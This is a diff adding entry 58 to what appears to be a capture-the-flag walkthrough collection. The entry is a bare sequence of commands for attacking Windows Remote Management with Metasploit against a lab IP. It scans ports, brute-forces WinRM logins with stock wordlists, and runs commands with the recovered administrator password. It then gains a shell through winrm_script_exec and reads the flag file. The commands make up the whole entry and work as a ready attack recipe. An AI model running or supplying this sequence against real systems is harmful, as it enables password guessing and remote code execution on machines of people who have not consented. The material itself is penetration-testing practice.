@@ -1100,8 +1100,37 @@ cd /
 dir
 type flag.txt
 ```
+58)  WinRM: Exploitation with Metasploit
+    
+```
+nmap --top-ports 7000 10.0.0.173
+msfconsole -q
+use auxiliary/scanner/winrm/winrm_login
+set RHOSTS 10.0.0.173
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+exploit
+use auxiliary/scanner/winrm/winrm_auth_methods
+set RHOSTS 10.0.0.173
+exploit
+use auxiliary/scanner/winrm/winrm_cmd
+set RHOSTS 10.0.0.173
+set USERNAME administrator
+set PASSWORD tinkerbell
+set CMD whoami
+exploit
+use exploit/windows/winrm/winrm_script_exec
+set RHOSTS 10.0.0.173
+set USERNAME administrator
+set PASSWORD tinkerbell
+set FORCE_VBS true
+exploit
+cd /
+dir
+type flag.txt
 
-
+```
 
 
 
